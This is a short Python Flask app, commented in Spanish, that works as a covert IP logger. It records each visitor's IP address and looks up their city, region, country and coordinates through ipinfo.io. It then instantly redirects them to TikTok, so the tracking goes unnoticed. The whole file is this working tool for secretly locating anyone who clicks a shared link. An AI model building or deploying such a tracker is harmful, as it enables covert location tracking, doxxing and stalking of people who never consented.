from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

@app.route("/")
def home():
    # Obtener IP del visitante
    if request.headers.get("X-Forwarded-For"):
        ip = request.headers.get("X-Forwarded-For").split(",")[0].strip()
    else:
        ip = request.remote_addr

    print("IP visitante:", ip)

    # Solo consultar geolocalización si no es localhost
    if ip != "127.0.0.1":
        info = requests.get(f"https://ipinfo.io/{ip}/json").json()

        print("Ciudad:", info.get("city"))
        print("Región:", info.get("region"))
        print("País:", info.get("country"))
        print("Ubicación:", info.get("loc"))
    else:
        print("Es localhost, no se puede geolocalizar.")

    # 🔥 Redirección inmediata
    return redirect("https://www.tiktok.com", code=302)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)